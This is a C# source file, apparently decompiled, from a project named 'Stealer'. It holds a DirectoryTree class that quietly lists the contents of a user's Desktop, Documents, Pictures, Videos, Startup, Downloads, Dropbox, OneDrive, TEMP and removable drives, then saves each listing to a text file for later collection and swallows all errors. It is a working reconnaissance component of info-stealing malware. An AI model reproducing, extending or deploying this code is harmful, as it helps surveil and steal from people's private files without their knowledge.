using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace Stealer
{
	// Token: 0x02000016 RID: 22
	internal sealed class DirectoryTree
	{
		// Token: 0x06000076 RID: 118 RVA: 0x00004A64 File Offset: 0x00002C64
		private static string GetDirectoryTree(string path, string indentation = "\t", int maxLevel = -1, int deep = 0)
		{
			if (!Directory.Exists(path))
			{
				return "Directory not exists";
			}
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine(string.Concat(Enumerable.Repeat<string>(indentation, deep)) + directoryInfo.Name + "\\");
			if (maxLevel == -1 || maxLevel < deep)
			{
				try
				{
					foreach (DirectoryInfo directoryInfo2 in directoryInfo.GetDirectories())
					{
						try
						{
							stringBuilder.Append(DirectoryTree.GetDirectoryTree(directoryInfo2.FullName, indentation, maxLevel, deep + 1));
						}
						catch (UnauthorizedAccessException)
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
			try
			{
				foreach (FileInfo fileInfo in directoryInfo.GetFiles())
				{
					stringBuilder.AppendLine(string.Concat(Enumerable.Repeat<string>(indentation, deep + 1)) + fileInfo.Name);
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
			return stringBuilder.ToString();
		}

		// Token: 0x06000077 RID: 119 RVA: 0x00004B68 File Offset: 0x00002D68
		private static string GetDirectoryName(string path)
		{
			string name = new DirectoryInfo(path).Name;
			if (name.Length == 3)
			{
				return "DRIVE-" + name.Replace(":\\", "");
			}
			return name;
		}

		// Token: 0x06000078 RID: 120 RVA: 0x00004BA8 File Offset: 0x00002DA8
		public static void SaveDirectories(string sSavePath)
		{
			foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
			{
				if (driveInfo.DriveType == DriveType.Removable && driveInfo.IsReady)
				{
					DirectoryTree.TargetDirs.Add(driveInfo.RootDirectory.FullName);
				}
			}
			foreach (string path in DirectoryTree.TargetDirs)
			{
				try
				{
					string directoryTree = DirectoryTree.GetDirectoryTree(path, "\t", -1, 0);
					string directoryName = DirectoryTree.GetDirectoryName(path);
					if (!directoryTree.Contains("Directory not exists"))
					{
						File.WriteAllText(Path.Combine(sSavePath, directoryName + ".txt"), directoryTree);
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x04000053 RID: 83
		private static List<string> TargetDirs = new List<string>
		{
			Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
			Environment.GetFolderPath(Environment.SpecialFolder.Personal),
			Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
			Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
			Environment.GetFolderPath(Environment.SpecialFolder.Startup),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
			Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "Dropbox"),
			Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "OneDrive"),
			Environment.GetEnvironmentVariable("TEMP")
		};
	}
}
